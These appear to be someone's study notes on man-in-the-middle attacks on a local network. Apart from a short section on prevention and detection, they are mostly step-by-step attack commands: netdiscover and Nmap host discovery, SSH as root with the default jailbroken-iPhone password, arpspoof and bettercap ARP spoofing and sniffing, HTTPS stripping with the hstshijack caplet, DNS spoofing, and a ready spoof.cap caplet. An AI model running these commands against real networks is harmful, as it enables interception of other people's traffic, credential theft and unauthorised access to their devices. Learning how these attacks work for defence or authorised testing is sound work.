
Middle Man
---------

ARP Spoofing
-----------

ARP spoofing is a type of attack in which a malicious actor sends falsified ARP (Address Resolution Protocol) messages over a local area network. This results in the linking of an attacker's MAC address with the IP address of a legitimate computer or server on the network.

To prevent use
------------

VPN https://protonvpn.com/

One of the best ways to protect your computer from ARP spoofing attack is by using a VPN.  A VPN will allow you to do online activities through an encrypted tunnel. Not only is the mode of transmission encrypted but also the data that goes through it.

To detect use
-----------

XArp http://www.xarp.net/
Wireshark https://2.na.dl.wireshark.org/osx/Wireshark%203.4.7%20Intel%2064.dmg

> arp -a

For Tools use
-----------

Wireshark https://2.na.dl.wireshark.org/osx/Wireshark%203.4.7%20Intel%2064.dmg
Arpy https://github.com/ivanvza/arpy

"In wireshark filter by the following"

http.host == website_url
ip.addr == ip_address

Netdiscover
----------

"Command below will show connected devices of access point"

> netdiscover -r 192.168.8.1/24

"You can use also other tools such as Nmap or ZenMap"

NMap/ZenMap
-----------

NMap/ZenMap https://nmap.org/

There are many scan types
- Quick Scan
- Regular Scan
- Quick Scan Plus
- Intense Scan

"When it was found open port such as ssh, it can be access"

> ssh root@ip_address

"In iphone, there was rooted; Default password is alpine"

ARP Spoof
---------

> arpspoof -i [interface_name] -t [client_ip] [gateway_ip]
> arpspoof -i [interface_name] -t [gateway_ip] [client_ip]

Better Cap
----------

> bettercap --help

> bettercap -iface [interface_name]
> help

"You will see also module"

> help net.probe
> net.probe on
> net.recon on
> help arp.spoof
> set arp.spoof.fullduplex true
> set arp.spoof.targets [target_ip_s]
> arp.spoof on
> net.sniff on

> net.show

> bettercap -iface [interface_name] -caplet [dir/file_name.cap]

"Lets bypass https"

e.g - https://stackoverflow.com -> http://stackoverflow.com

- extract hstshijack.zip
- copy extracted folder to under this '/usr/share/bettercap/caplets/' directory

> bettercap -iface [interface_name] -caplet [dir/file_name.cap]
> caplet.show
> hstshijack/hstshijack

"hstshijack/hstshijack command is for hijacking https"

"Lets downgrade https"

e.g - facebook.com -> facebook.corn

"Open in notepad this file -> /usr/share/bettercap/caplets/hstshijack/hstshijack.cap "

"Lets do DNS Spoofing"

Domain Name Server (DNS) spoofing (a.k.a. DNS cache poisoning) is an attack in which altered DNS records are used to redirect online traffic to a fraudulent website that resembles its intended destination.

e.g - Look the following

IP Address of www.google.com is 100.100.100.1
IP Address of www.hackerwebsite is 69.69.69.1

Client -www.google.com-> Man In the Middle ---------- Google | Hacker Website
Client <-69.69.69.1- Man In the Middle ---------- Google | Hacker Website

"Run apache server in linux"

> bettercap -iface [interface_name] -caplet [dir/file_name.cap]
> help dns.spoof
> set dns.spoof.all true
> set dns.spoof.domains [domains_sperated_by_comma]
> dns.spoof on

spoof.cap
---------

net.probe on
set arp.spoof.fullduplex true
set arp.spoof.targets [ip_address]
arp.spoof on
net.sniff on







































